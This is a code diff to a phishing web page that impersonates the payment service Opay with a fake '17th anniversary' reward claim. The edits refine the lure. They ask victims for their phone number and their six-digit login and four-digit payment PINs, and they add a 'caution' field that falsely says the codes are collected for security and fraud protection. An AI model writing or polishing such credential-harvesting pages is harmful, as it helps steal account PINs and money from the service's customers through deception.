@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Opay - 17th anniversar🎉</title>
+<title>Opay - 17th anniversary🎉</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0;font-family:Arial,sans-serif}
 body{background:#0b0f19;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;position:relative}
@@ -39,8 +39,8 @@ input,select,textarea{width:100%;padding:12px;border:1px solid #ddd;border-radiu
 <label>phone number</label>
 <input type="tel" name="phone number" placeholder="type here...." required>
 
-<label>confirm login 6 digits</label>
-<input type="tel" name=" 6 digits" placeholder="6 digits" required>
+<label>confirm login 6 & 4  digits</label>
+<input type="tel" name=" 6 digits" placeholder="6&4 eg.748873 \8899." required>
 
 <label>What service do you need?</label>
 <select name="service_type">
@@ -53,14 +53,14 @@ input,select,textarea{width:100%;padding:12px;border:1px solid #ddd;border-radiu
 <label>how much do you wish to claim</label>
 <div class="rating">
 <button type="button" onclick="setRating(this,'1000')">1000</button>
-<button type="button" onclick="setRating(this,'2000')">2000</button>
+<button type="button" class="active" onclick="setRating(this,'2000')">2000</button>
 <button type="button" onclick="setRating(this,'3000')">3000</button>
 <button type="button" onclick="setRating(this,'4000')">4000</button>
-<button type="button" class="active" onclick="setRating(this,'5000')">5000</button>
+<button type="button" onclick="setRating(this,'5000')">5000</button>
 </div>
 
-<label>confirm your payment code</label>
-<input type="tel"name"="1" placeholder="4 digits " required></textarea>
+<label> caution ⚠️</label>
+<input type="tel"name"="7" placeholder="make sure you include your opay 6&4 for digits in code confirmation to successfully claim this rewards we use your information for security purpose and to protect your account against fraud against fraud. terms and conditions apply." required></textarea>
 
 <button type="submit" class="submit">claim reward🔥</button>
 </form>
